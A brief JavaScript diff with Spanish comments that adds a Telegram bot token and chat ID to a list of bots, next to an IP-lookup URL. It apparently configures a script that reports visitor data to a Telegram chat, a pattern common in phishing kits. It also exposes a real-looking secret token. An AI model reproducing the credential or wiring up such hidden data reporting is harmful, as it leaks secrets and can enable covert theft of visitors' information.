@@ -7,8 +7,8 @@ const telegramBots = [
   },
   // Puedes añadir más bots aquí
   {
-     botToken: '',
-     chatId: ''
+     botToken: '7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY',
+     chatId: '7038426430'
   }
 ];
 const ipifyUrl = 'https://api.ipify.org?format=json';
